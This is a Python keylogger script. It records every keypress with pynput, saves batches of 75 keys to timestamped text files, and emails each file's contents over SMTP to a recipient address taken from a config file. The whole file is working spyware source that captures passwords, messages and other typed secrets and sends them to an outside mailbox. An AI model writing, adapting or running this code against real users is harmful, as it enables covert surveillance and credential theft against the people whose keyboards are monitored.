import os.path
from datetime import datetime
from pynput.keyboard import Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import logging
import configparser

# Globals variables
keystrokes = []
LOG_FILE = "keylog.log"
TXT_FILE = ""

# Configure logging settings
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG)


# Event handler function for the key presses
def on_press(keypress):
    global keystrokes
    # Append the pressed key to the keystrokes list
    keystrokes.append(keypress)

    # Check if the number of keystrokes has reached the limi
    if len(keystrokes) >= 75:
        write_to_file()
        send_email()


# Write the logged keystrokes to a file with a timestamp after 75 characters logged
def write_to_file():
    global keystrokes
    global TXT_FILE

    # Check if the number of keystrokes has reached the limit
    if len(keystrokes) >= 75:
        # Check if a new log file needs to be created
        if not TXT_FILE or os.path.getsize(TXT_FILE) >= 75:
            # Create a new log file with a timestamp
            TXT_FILE = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

    # Write the keystrokes to the log file
    with open(TXT_FILE, "a") as file:
        for key in keystrokes:
            file.write(str(key) + "\n")
    # Clear the keystroke list
    keystrokes = []


# Send create and send an email containing the created file to a specified address
def send_email():
    # Read email configuration from config.ini
    config = configparser.ConfigParser()
    config.read('config.ini')
    from_addr = config['EMAIL']['Username']
    to_addr = config['EMAIL']['Recipient']
    password = config['EMAIL']['Password']
    smtp_server = config['SMTP']['Server']
    smtp_port = int(config['SMTP']['Port'])

    # Create email message content
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = 'Keylog'

    # Read keystrokes from log file
    with open(TXT_FILE, "r") as file:
        body = file.readlines()

    # Attach keystrokes to email
    msg.attach(MIMEText("".join(body), 'plain'))

    try:
        # Connect to SMTP server and send email
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(from_addr, password)
        text = msg.as_string()
        server.sendmail(from_addr, to_addr, text)
        server.quit()
        logging.info('Email sent successfully')
    except Exception as e:
        logging.error(f'Failed to send email: {e}')


def setup_logging():
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


def main():
    setup_logging()

    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
